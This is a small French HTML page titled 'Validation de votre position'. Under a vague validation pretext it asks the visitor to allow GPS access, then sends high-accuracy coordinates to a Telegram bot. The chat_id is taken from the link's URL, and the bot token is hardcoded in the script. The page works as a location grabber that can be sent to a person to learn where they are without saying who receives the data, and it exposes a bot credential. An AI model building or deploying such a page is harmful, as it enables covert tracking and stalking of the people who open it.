<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validation de votre position</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f9;
        }
        h1 {
            color: #333;
        }
        button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 15px 25px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #006699;
        }
    </style>
</head>
<body>

    <h1>Validation de votre position</h1>
    <p>Veuillez autoriser l'accès au GPS pour continuer.</p>
    
    <button id="authButton">Autoriser et Envoyer</button>

    <script>
        // Votre Token de bot Telegram
        const BOT_TOKEN = "8805637787:AAGMIxpTUNKuIHnSRLiyYgCS980X7khKSQg";

        // 1. Récupérer le chat_id passé dans l'URL
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chat_id');

        console.log("Chat ID récupéré :", chatId);

        // 2. Gérer l'action au clic sur le bouton
        document.getElementById('authButton').addEventListener('click', async () => {
            if (!chatId) {
                alert("Erreur : Aucun identifiant de chat (chat_id) trouvé dans l'URL.");
                return;
            }

            // 3. Demander la géolocalisation au navigateur
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // 4. Utiliser l'API sendLocation de Telegram pour envoyer une carte interactive
                    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;

                    try {
                        // 5. Envoyer la position au bot via une requête réseau
                        const response = await fetch(telegramApiUrl);
                        if (response.ok) {
                            alert("Position GPS envoyée avec succès sur Telegram sous forme de carte !");
                        } else {
                            alert("Erreur lors de l'envoi de la position au bot.");
                        }
                    } catch (error) {
                        console.error("Erreur réseau :", error);
                        alert("Erreur de connexion lors de l'envoi.");
                    }

                }, (error) => {
                    alert("Erreur de géolocalisation : " + error.message);
                }, { enableHighAccuracy: true });
            } else {
                alert("La géolocalisation n'est pas supportée par votre navigateur.");
            }
        });
    </script>

</body>
</html>
